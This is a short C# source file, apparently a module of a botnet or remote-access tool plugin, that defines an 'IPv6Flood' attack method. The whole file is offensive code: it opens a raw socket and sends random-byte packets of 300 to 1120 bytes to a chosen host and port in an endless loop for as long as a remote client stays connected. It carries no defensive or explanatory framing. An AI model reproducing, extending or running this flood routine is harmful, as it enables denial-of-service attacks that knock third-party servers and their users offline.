using System.Net;
using System.Net.Sockets;
using Plugin.Helper;

namespace Plugin.Methods;

internal class IPv6Flood : Method
{
	public string Name { get; } = "IPv6Flood";


	public void Run(string host, int port)
	{
		IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(host), port);
		Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IPv6);
		socket.Blocking = false;
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				byte[] bytes = Common.Encodings[Randomizer.random.Next(Common.Encodings.Length)].GetBytes(Randomizer.getRandomCharacters(Randomizer.random.Next(300, 1120)));
				socket.SendTo(bytes, remoteEP);
			}
			catch
			{
				socket.Dispose();
				socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IPv6);
				socket.Blocking = false;
			}
		}
		socket.Dispose();
	}
}
